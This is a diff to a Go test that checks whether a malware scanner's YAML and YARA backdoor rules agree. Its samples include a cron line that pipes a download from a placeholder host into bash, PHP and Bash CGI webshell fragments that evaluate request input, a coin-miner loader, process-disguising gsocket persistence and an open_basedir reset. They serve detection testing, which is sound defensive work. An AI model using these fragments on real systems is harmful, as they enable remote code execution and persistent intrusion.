@@ -29,11 +29,13 @@ func TestRepositoryBackdoorRulesMatchScannerParity(t *testing.T) {
 	}
 
 	tests := []struct {
-		name   string
-		rule   string
-		ext    string
-		want   bool
-		sample string
+		name           string
+		rule           string
+		yaraRule       string
+		absentYaraRule string
+		ext            string
+		want           bool
+		sample         string
 	}{
 		{
 			name: "self-hiding incident loader",
@@ -342,10 +344,62 @@ $out = shell_exec($cmd);`,
 			sample: `<?php $url = 'https://api.example.test/data'; $content = curl_exec($ch);`,
 		},
 		{
-			name:   "payload staged under an icon cache name",
+			name:     "mixed-case cron downloader",
+			rule:     "backdoor_cron_reverse_shell",
+			yaraRule: "backdoor_cron_downloader",
+			ext:      ".cron",
+			want:     true,
+			sample:   "*/5 * * * * CURL https://payload.example.test/run | BASH\n",
+		},
+		{
+			name:     "mixed-case Bash CGI webshell markers",
+			rule:     "cgi_bash_webshell",
+			yaraRule: "cgi_webshell_bash",
+			ext:      ".cgi",
+			want:     true,
+			sample:   "#!/bin/bash\nCONTENT-TYPE: text/plain\ncmd=$(BASE64 -d <<< \"$QUERY_STRING\")\nEVAL \"$cmd\"\n",
+		},
+		{
+			name:     "mixed-case WordPress XML-RPC multicall",
+			rule:     "exploit_wp_xmlrpc",
+			yaraRule: "exploit_wp_xmlrpc_abuse",
+			want:     true,
+			sample:   "<?php $url = 'XMLRPC.PHP'; $body = '<METHODNAME>SyStEm.MuLtIcAlL</METHODNAME>';",
+		},
+		{
+			name:     "mixed-case CoinHive loader",
+			rule:     "miner_coinhive_js",
+			yaraRule: "miner_coinhive",
+			ext:      ".js",
+			want:     true,
+			sample:   "const miner = new cOiNhIvE.AnOnYmOuS('site-key');",
+		},
+		{
+			name:     "mixed-case LiteSpeed request shell",
+			rule:     "webshell_litespeed_backdoor",
+			yaraRule: "webshell_litespeed_disguise",
+			want:     true,
+			sample:   "<?php /* LiTeSpEeD cache */ EvAl($_REQUEST['x']);",
+		},
+		{
+			name:     "mixed-case WordPress core modification",
+			rule:     "wp_core_file_modify",
+			yaraRule: "exploit_wp_core_modification",
+			want:     true,
+			sample:   "<?PHP FiLe_PuT_CoNtEnTs(ABSPATH . 'WP-ADMIN/includes/x.PHP', $payload);",
+		},
+		{
+			name:           "payload staged under an icon cache name",
+			rule:           "backdoor_iconcache",
+			absentYaraRule: "backdoor_iconcache_disguise",
+			want:           true,
+			sample:         "<?php\n$f = 'iconcache.ico';\neval(base64_decode($payload));\n",
+		},
+		{
+			name:   "mixed-case payload staged under a favicon name",
 			rule:   "backdoor_iconcache",
 			want:   true,
-			sample: "<?php\n$f = 'iconcache.ico';\neval(base64_decode($payload));\n",
+			sample: "<?PHP\n$f = 'FaViCoN.IcO';\nEvAl(GzUnCoMpReSs($payload));\n",
 		},
 		{
 			name:   "theme serving its own favicon",
@@ -358,37 +412,96 @@ $out = shell_exec($cmd);`,
 			sample: "<?php\n$data = base64_decode($input);\necho htmlspecialchars($data);\n",
 		},
 		{
-			name:   "mu-plugin loader including a decoded path",
-			rule:   "backdoor_wp_muplugin_loader",
+			name:     "mu-plugin loader including a decoded path",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			want:     true,
+			sample:   "<?php\n@include(base64_decode('L3RtcC94'));\n$dir = WPMU_PLUGIN_DIR . '/mu-plugins';\n",
+		},
+		{
+			name:     "mixed-case mu-plugin loader including a decoded path",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			want:     true,
+			sample:   "<?PHP\n@InClUdE(BaSe64_DeCoDe('L3RtcC94'));\n$dir = '/MU-PLUGINS';\n",
+		},
+		{
+			name:     "mixed-case decoded include outside a mu-plugin loader",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			sample:   "<?PHP\n@InClUdE(BaSe64_DeCoDe('L3RtcC94'));\n$dir = '/ordinary-plugin';\n",
+		},
+		{
+			name:     "lowercase decoded include outside a mu-plugin loader",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			sample:   "<?php\n@include(base64_decode('L3RtcC94'));\n$dir = '/ordinary-plugin';\n",
+		},
+		{
+			name:     "mu-plugin loader including its own directory",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			sample:   "<?php\nforeach (glob(WPMU_PLUGIN_DIR . '/mu-plugins/*.php') as $f) { include_once $f; }\n",
+		},
+		{
+			name:   "mu-plugin invoking a command sink",
+			rule:   "backdoor_wp_muplugin",
 			want:   true,
-			sample: "<?php\n@include(base64_decode('L3RtcC94'));\n$dir = WPMU_PLUGIN_DIR . '/mu-plugins';\n",
+			sample: "<?php\n// wp-content/mu-plugins/loader.php\nexec($command);\n",
 		},
 		{
-			name:   "mu-plugin loader including its own directory",
-			rule:   "backdoor_wp_muplugin_loader",
-			sample: "<?php\nforeach (glob(WPMU_PLUGIN_DIR . '/mu-plugins/*.php') as $f) { include_once $f; }\n",
+			name:     "JavaScript documentation of a decoded mu-plugin include",
+			rule:     "backdoor_wp_muplugin_loader",
+			yaraRule: "backdoor_wp_muplugin",
+			ext:      ".js",
+			sample:   "const example = `@include(base64_decode($path)); // mu-plugins`;\n",
 		},
 		{
-			name:   "gsocket persistence disguising its process name",
-			rule:   "gsocket_persistence",
-			want:   true,
-			sample: "#!/bin/sh\n# SEED PRNG\nexec -a '[defunct-kernel]' ./gs-netcat\n",
+			name:     "gsocket persistence disguising its process name",
+			rule:     "gsocket_persistence",
+			yaraRule: "gsocket_cron_persistence",
+			want:     true,
+			sample:   "#!/bin/sh\n# SEED PRNG\nexec -a '[defunct-kernel]' ./gs-netcat\n",
 		},
 		{
-			name:   "script seeding a PRNG for reproducible output",
-			rule:   "gsocket_persistence",
-			sample: "#!/bin/sh\n# SEED PRNG for reproducible test vectors\nopenssl rand -hex 16\n",
+			name:     "mixed-case gsocket persistence marker",
+			rule:     "gsocket_persistence",
+			yaraRule: "gsocket_cron_persistence",
+			want:     true,
+			sample:   "#!/bin/sh\n# seed prng\nexec -a '[DEFUNCT-KERNEL]' ./gs-netcat\n",
 		},
 		{
-			name:   "assert used to execute request input",
-			rule:   "obfuscation_assert_string",
-			want:   true,
-			sample: "<?php\nassert(base64_decode($_POST['x']));\n",
+			name:     "script seeding a PRNG for reproducible output",
+			rule:     "gsocket_persistence",
+			yaraRule: "gsocket_cron_persistence",
+			sample:   "#!/bin/sh\n# SEED PRNG for reproducible test vectors\nopenssl rand -hex 16\n",
 		},
 		{
-			name:   "assert used as an ordinary invariant check",
-			rule:   "obfuscation_assert_string",
-			sample: "<?php\nassert(is_array($config), 'config must be an array');\n",
+			name:     "assert used to execute request input",
+			rule:     "obfuscation_assert_string",
+			yaraRule: "obfuscation_assert_exec",
+			want:     true,
+			sample:   "<?php\nassert(base64_decode($_POST['x']));\n",
+		},
+		{
+			name:     "mixed-case assert used to execute request input",
+			rule:     "obfuscation_assert_string",
+			yaraRule: "obfuscation_assert_exec",
+			want:     true,
+			sample:   "<?PHP\nAsSeRt(StRiPsLaShEs($_POST['x']));\n",
+		},
+		{
+			name:     "assert used as an ordinary invariant check",
+			rule:     "obfuscation_assert_string",
+			yaraRule: "obfuscation_assert_exec",
+			sample:   "<?php\nassert(is_array($config), 'config must be an array');\n",
+		},
+		{
+			name:     "JavaScript documentation of assert decoding",
+			rule:     "obfuscation_assert_string",
+			yaraRule: "obfuscation_assert_exec",
+			ext:      ".js",
+			sample:   "const blocked = 'assert(base64_decode($payload))';\n",
 		},
 		{
 			name:   "hex unpack feeding execution",
@@ -397,20 +510,48 @@ $out = shell_exec($cmd);`,
 			sample: "<?php\n$h = unpack(\"H*\", $blob);\neval($h[1]);\n",
 		},
 		{
+			name:   "mixed-case hex unpack feeding execution",
+			rule:   "obfuscation_compact_unpack",
+			want:   true,
+			sample: "<?PHP\n$h = UnPaCk(\"h*\", $blob);\nAsSeRt($h[1]);\n",
+		},
+		{
 			name:   "hex unpack used for a checksum",
 			rule:   "obfuscation_compact_unpack",
 			sample: "<?php\n$hex = unpack(\"H*\", $binary);\nprintf('checksum: %s', $hex[1]);\n",
 		},
 		{
-			name:   "open_basedir reset to empty",
-			rule:   "php_open_basedir_override",
-			want:   true,
-			sample: "<?php\nini_set('open_basedir', '');\n",
+			name:   "JavaScript documentation of hex unpack execution",
+			rule:   "obfuscation_compact_unpack",
+			ext:    ".js",
+			sample: "const example = 'unpack(\"H*\", $blob); eval($h[1]);';\n",
 		},
 		{
-			name:   "open_basedir narrowed to real paths",
-			rule:   "php_open_basedir_override",
-			sample: "<?php\nini_set('open_basedir', '/home/u:/tmp');\nini_set('memory_limit', '256M');\n",
+			name:     "open_basedir reset to empty",
+			rule:     "php_open_basedir_override",
+			yaraRule: "exploit_open_basedir_escape",
+			want:     true,
+			sample:   "<?php\nini_set('open_basedir', '');\n",
+		},
+		{
+			name:     "mixed-case comment-separated open_basedir reset",
+			rule:     "php_open_basedir_override",
+			yaraRule: "exploit_open_basedir_escape",
+			want:     true,
+			sample:   "<?PHP\nInI_SeT/**/(/**/'OpEn_BaSeDiR'/**/,/**/'/'/**/);\n",
+		},
+		{
+			name:     "open_basedir narrowed to real paths",
+			rule:     "php_open_basedir_override",
+			yaraRule: "exploit_open_basedir_escape",
+			sample:   "<?php\nini_set('open_basedir', '/home/u:/tmp');\nini_set('memory_limit', '256M');\n",
+		},
+		{
+			name:     "JavaScript documentation of an open_basedir reset",
+			rule:     "php_open_basedir_override",
+			yaraRule: "exploit_open_basedir_escape",
+			ext:      ".js",
+			sample:   "const blocked = `ini_set('open_basedir', '')`;\n",
 		},
 		{
 			// Stock theme and plugin code names dispensary demo content and a
@@ -688,13 +829,21 @@ $out = shell_exec($cmd);`,
 			if ext == "" {
 				ext = ".php"
 			}
+			yaraRule := tc.yaraRule
+			if yaraRule == "" {
+				yaraRule = tc.rule
+			}
 			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), ext), tc.rule)
-			yaraHit := hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.rule)
+			yaraMatches := yaraScanner.ScanBytes([]byte(tc.sample))
+			yaraHit := hasRepositoryYaraRule(yaraMatches, yaraRule)
 			if yamlHit != yaraHit {
-				t.Fatalf("%s outcome differs: YAML=%t YARA=%t", tc.rule, yamlHit, yaraHit)
+				t.Fatalf("%s/%s outcome differs: YAML=%t YARA=%t", tc.rule, yaraRule, yamlHit, yaraHit)
 			}
 			if yamlHit != tc.want {
 				t.Errorf("%s outcome = %t, want %t", tc.rule, yamlHit, tc.want)
+			}
+			if tc.absentYaraRule != "" && hasRepositoryYaraRule(yaraMatches, tc.absentYaraRule) {
+				t.Errorf("%s unexpectedly also matched %s", tc.rule, tc.absentYaraRule)
 			}
 		})
 	}
